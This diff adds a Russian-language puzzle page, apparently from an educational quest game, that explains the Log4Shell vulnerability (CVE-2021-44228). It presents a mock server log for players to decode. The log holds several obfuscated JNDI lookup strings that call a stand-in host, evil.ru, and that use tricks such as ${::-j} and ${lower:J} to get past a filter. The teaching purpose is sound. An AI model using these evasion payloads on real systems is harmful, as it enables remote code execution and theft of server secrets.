@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Угроза №8 — Log4Shell</title>
+<style>
+  @font-face { font-family: "Martian Mono"; src: url("fonts/martian-cyrillic.woff2") format("woff2"); font-weight: 100 800; unicode-range: U+0400-045F, U+2116; }
+  @font-face { font-family: "Martian Mono"; src: url("fonts/martian-latin.woff2") format("woff2"); font-weight: 100 800; unicode-range: U+0000-00FF, U+2000-206F; }
+  @font-face { font-family: "IBM Plex Mono"; src: url("fonts/plex-cyrillic-400.woff2") format("woff2"); font-weight: 400; unicode-range: U+0400-045F, U+2116; }
+  @font-face { font-family: "IBM Plex Mono"; src: url("fonts/plex-cyrillic-600.woff2") format("woff2"); font-weight: 600 700; unicode-range: U+0400-045F, U+2116; }
+  @font-face { font-family: "IBM Plex Mono"; src: url("fonts/plex-latin-400.woff2") format("woff2"); font-weight: 400; unicode-range: U+0000-00FF, U+2000-206F; }
+  @font-face { font-family: "IBM Plex Mono"; src: url("fonts/plex-latin-600.woff2") format("woff2"); font-weight: 600 700; unicode-range: U+0000-00FF, U+2000-206F; }
+  :root {
+    --void: #000400; --code: #00ff41; --dim: #3f9a58; --text: #c9f5d4; --white: #e6ffec;
+    --edge: rgba(0,255,65,.3); --red: #ff2a3d;
+    --glow: 0 0 6px rgba(0,255,65,.65), 0 0 18px rgba(0,255,65,.25);
+    --display: "Martian Mono", Consolas, "Courier New", monospace;
+    --font: "IBM Plex Mono", Consolas, "Courier New", monospace;
+    --mono: var(--font);
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; color: var(--text); font: 18px/1.65 var(--font);
+    background: var(--void);
+    background-image: repeating-linear-gradient(rgba(0,255,65,.035) 0 1px, transparent 1px 3px);
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 32px 22px 64px; }
+  .head { display: grid; grid-template-columns: auto 1fr; gap: 24px; align-items: center; }
+  .head img { width: 150px; height: 150px; object-fit: cover; border: 1px solid var(--code); box-shadow: 0 0 20px rgba(0,255,65,.3); }
+  .tag { display: inline-block; color: var(--red); border: 1px solid var(--red); font-weight: 700; font-size: 15px; padding: 2px 10px; text-shadow: 0 0 6px rgba(255,42,61,.7); }
+  .tag::before { content: "[!] "; }
+  h1 { font-family: var(--display); font-size: 34px; font-weight: 800; line-height: 1.15; margin: 10px 0 6px; color: var(--code); text-shadow: var(--glow); }
+  .en { color: var(--dim); font-size: 15px; }
+  h2 { font-family: var(--display); font-size: 20px; font-weight: 800; margin: 34px 0 10px; color: var(--white); text-shadow: var(--glow); }
+  h2::before { content: "> "; color: var(--dim); text-shadow: none; }
+  p { margin: 0 0 14px; max-width: 72ch; }
+  .story { border-left: 2px solid var(--code); padding: 2px 0 2px 16px; }
+  .sheet {
+    background: rgba(0,14,5,.9); color: var(--white); border: 1px solid var(--edge); padding: 20px 22px; margin: 18px 0;
+    box-shadow: inset 0 0 30px rgba(0,255,65,.05);
+  }
+  .sheet p:last-child { margin-bottom: 0; }
+  .sheet table { border-collapse: collapse; width: 100%; }
+  .sheet th, .sheet td { border: 1px solid rgba(0,255,65,.22); padding: 8px 12px; text-align: left; vertical-align: top; }
+  .sheet th { color: var(--dim); font-weight: 600; font-size: 15px; }
+  .mark { font-family: var(--display); color: var(--code); font-weight: 800; text-align: center !important; width: 80px; text-shadow: var(--glow); }
+  .num { font-family: var(--display); font-weight: 700; text-align: center !important; width: 60px; color: var(--dim); }
+  .note { border: 1px dashed var(--edge); padding: 14px 18px; margin: 18px 0; }
+  .note b, .story b, .sheet b { color: var(--code); text-shadow: var(--glow); }
+  .big { font-family: var(--display); font-weight: 800; font-size: 32px; letter-spacing: .08em; word-break: break-all; line-height: 1.4; color: var(--code); text-shadow: var(--glow); }
+  .code { font-family: var(--font); font-size: 16px; }
+  .chain { word-break: normal; } .chain span { display: inline-block; white-space: nowrap; }
+  .poem p { margin: 0; }
+  .alpha { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 8px; }
+  .alpha span { width: 46px; height: 52px; border: 1px solid rgba(0,255,65,.3); display: grid; place-items: center; font-family: var(--display); font-weight: 700; line-height: 1.05; text-align: center; color: var(--code); }
+  .alpha small { display: block; font-family: var(--font); font-weight: 600; font-size: 12px; color: var(--dim); }
+  .pult-link { display: inline-block; margin-top: 8px; padding: 12px 16px; border: 1px solid var(--edge); color: var(--code); text-decoration: none; font-weight: 600; }
+  .footer { margin-top: 40px; padding-top: 16px; border-top: 1px dashed var(--edge); color: var(--code); font-weight: 600; text-shadow: var(--glow); }
+  @media (max-width: 600px) {
+    .wrap { padding: 20px 12px 48px; }
+    .head { grid-template-columns: 1fr; } h1 { font-size: 26px; } .big { font-size: 22px; }
+    .sheet { padding: 14px 12px; }
+    .sheet th, .sheet td { padding: 6px 7px; }
+    .wire { min-width: 48px !important; }
+    .alpha span { width: 38px; height: 46px; }
+  }
+  @media print {
+    body { background: #fff; color: #000; }
+    h1, h2, .tag, .en, .mark, .num, .big, .footer, .alpha span, .alpha small, .note b, .story b, .sheet b, .sheet th { color: #000 !important; text-shadow: none !important; }
+    .sheet { background: #fff; color: #000; box-shadow: none; border-color: #000; }
+    .sheet th, .sheet td, .alpha span, .note, .story, .tag, .footer { border-color: #000 !important; }
+    .head img { box-shadow: none; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="head">
+    <img src="figura.jpg" alt="">
+    <div>
+      <span class="tag">Угроза №8</span>
+      <h1>Log4Shell</h1>
+      <div class="en">Log4Shell, CVE-2021-44228, ${jndi:ldap://}</div>
+    </div>
+  </div>
+
+  <h2>Досье</h2>
+  <div class="story">
+    <p>Сервер записывает всё, что с ним происходит, в журнал — по-английски log (а ещё это слово
+    значит «бревно»). В 2021 году нашли дыру: если хакер вписывал вместо имени особую строчку
+    с <b>${</b>, сервер не просто записывал её, а выполнял как команду.
+    Команду по-английски называют shell («раковина») — отсюда улитка на бревне.</p>
+    <p>Опаснее всего команда <b>jndi:</b> — с ней сервер сам скачивал программу хакера.</p>
+  </div>
+
+  <h2>Задание</h2>
+  <p>Администраторы поставили фильтр: строчки, где прямо написано <span class="code">${jndi:</span>, блокируются.
+  Но хакер научился прятать слово jndi. Побудь уязвимым сервером и выполни его строчки по правилам:</p>
+  <div class="sheet">
+    <table>
+      <tr><th>Что написано</th><th>Во что превращается</th></tr>
+      <tr><td class="code">${::-X}</td><td>просто буква X. Например, <span class="code">${::-j}</span> → j</td></tr>
+      <tr><td class="code">${lower:X}</td><td>буква X, только маленькая. Например, <span class="code">${lower:J}</span> → j</td></tr>
+      <tr><td class="code">${env:ИМЯ}</td><td>то, что хранится в памяти сервера под этим именем (таблица ниже)</td></tr>
+    </table>
+  </div>
+  <div class="sheet">
+    <p>Память сервера:</p>
+    <table>
+      <tr><th class="code">K1</th><th class="code">K2</th><th class="code">K3</th><th class="code">K4</th><th class="code">K5</th><th class="code">K6</th><th class="code">K7</th><th class="code">K8</th></tr>
+      <tr><td class="mark">П</td><td class="mark">Р</td><td class="mark">А</td><td class="mark">О</td><td class="mark">Т</td><td class="mark">Ч</td><td class="mark">Л</td><td class="mark">Е</td></tr>
+    </table>
+  </div>
+  <p>Журнал сервера:</p>
+  <div class="sheet">
+    <table>
+      <tr><td class="code" style="white-space:nowrap">[10:00]</td><td class="code" style="overflow-wrap:anywhere">вход: user=masha</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:01]</td><td class="code" style="overflow-wrap:anywhere">вход: user=${jndi:ldap://evil.ru/${env:K2}}<br><b style="font-family:var(--font)">Заблокировано фильтром</b></td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:02]</td><td class="code" style="overflow-wrap:anywhere">вход: user=${${::-j}ndi:ldap://evil.ru/${env:K1}}</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:03]</td><td class="code" style="overflow-wrap:anywhere">поиск: ${lower:К}ОТИКИ</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:04]</td><td class="code" style="overflow-wrap:anywhere">вход: user=petya</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:05]</td><td class="code" style="overflow-wrap:anywhere">вход: user=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.ru/${env:K3}}</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:06]</td><td class="code" style="overflow-wrap:anywhere">поиск: ${env:K7}${env:K8}${env:K5}${env:K4}</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:07]</td><td class="code" style="overflow-wrap:anywhere">вход: user=${${::-n}${::-d}${::-i}:ldap://evil.ru/${env:K8}}</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:08]</td><td class="code" style="overflow-wrap:anywhere">вход: user=${${lower:J}ndi:ldap://evil.ru/${env:K5}}</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:09]</td><td class="code" style="overflow-wrap:anywhere">вход: user=dima</td></tr>
+      <tr><td class="code" style="white-space:nowrap">[10:10]</td><td class="code" style="overflow-wrap:anywhere">вход: user=${${::-j}ndi:${lower:L}dap://evil.ru/${env:K6}}</td></tr>
+    </table>
+  </div>
+  <p class="note">Атака сработала, только если строчка <b>прошла фильтр</b> и после расшифровки в ней получилось
+  <b>jndi:</b>. Каждая сработавшая атака украла из памяти одну букву — ту, что в конце строчки.
+  Выпиши украденные буквы по времени — получится ключ: так называют «заплатку», которая закрывает дыру.</p>
+
+  <p class="footer">Решайте вместе. Ключ вводит капитан на терминале защиты.</p>
+  <p><a class="pult-link" id="to-pult" href="../../play.html" hidden>← Мой пульт</a></p>
+</div>
+<script>
+  // Задание открыто по QR с фигурки: запоминаем его для пульта агента на этом телефоне.
+  (function () {
+    if (location.protocol.indexOf("http") !== 0) return;
+    try {
+      var key = "shield-quest:my-tasks";
+      var list = JSON.parse(localStorage.getItem(key) || "[]");
+      var path = location.pathname;
+      if (!list.some(function (t) { return t.path === path; })) {
+        list.push({ path: path, title: document.title, num: 8 });
+        localStorage.setItem(key, JSON.stringify(list));
+      }
+    } catch (e) { /* без сохранения задание всё равно открыто */ }
+    document.getElementById("to-pult").hidden = false;
+  })();
+</script>
+</body>
+</html>
